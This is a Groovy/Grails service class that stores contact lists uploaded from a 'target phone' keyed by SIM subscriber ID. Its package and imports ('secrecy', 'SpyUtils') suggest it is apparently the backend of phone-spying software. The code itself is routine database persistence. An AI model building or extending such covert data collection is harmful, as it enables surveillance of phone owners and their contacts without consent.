package com.atlancy.secrecy.services.helpers

import org.codehaus.jackson.map.DeserializationConfig
import org.codehaus.jackson.map.ObjectMapper
import org.codehaus.jackson.type.TypeReference
import org.springframework.dao.DuplicateKeyException

import com.atlancy.domain.Contact;
import com.atlancy.domain.TargetPhone;
import com.atlancy.secrecy.services.helpers.interfaces.ServiceInterface
import com.spy.tools.SpyUtils
import com.xaviar.market.rest.item.DataHolder
import com.xaviar.market.rest.item.DataHolderConstants

class ContactService implements ServiceInterface{

	@Override
	public Long getLastTs(String authSimSubscriberId) {
		List <Contact> contacts = Contact.createCriteria().list{
			and {
				targetPhone{ eq("simSubscriberId", authSimSubscriberId) }
			}
			//order("time","desc")
		};

		//		if(contacts!=null && contacts.size()>0){
		//			return contacts.get(0).time.getTime();
		//		}else{
		//			return null;
		//		}
		if(contacts!=null && contacts.size()>0){
			return contacts.size();
		}else{
			return 0;
		}
	}

	@Override
	public String getWishString(String authSimSubscriberId) {
		def contactsCount = getLastTs(authSimSubscriberId);
		if(contactsCount>0){
			//TODO - change to CALL_LOG no need for different wish like CALL_LOG_EVENT it needs to be managed by timestamp only.
			return "\"" + DataHolderConstants.CONTACTS_EVENT + "\":0";
		}else{
			return "\"" + DataHolderConstants.CONTACTS + "\":0";
		}
	}


	def addContacts(DataHolder dataHolder, TargetPhone targetPhone) {
		String clientContacts = dataHolder.get(DataHolderConstants.CONTACTS);
		if (clientContacts != null) {
			ObjectMapper mapper = new ObjectMapper();
			mapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES, false);
			List<Contact> contacts = mapper.readValue(clientContacts,new TypeReference<List<Contact>>() {
					});
			contacts.each{
				try{
					//it.id=it.id+"_"+targetPhone.simSubscriberId;
					it.targetPhone=targetPhone;

					if(it.number!=null){
						it.countryCode = SpyUtils.getCountryCode(it.number);
					}else{
						it.countryCode = "972";
					}

					it.recordOrigin="ORIGINAL";
					it.recordState="CREATED";
					it.save(flush:true, failOnError:true,insert:true);
				}catch(DuplicateKeyException e){
					println "Duplicate Key Exception : " + it.id+"_"+targetPhone.simSubscriberId;
				}catch(Exception e){
					e.printStackTrace();
				}
			}
		}
	}
}
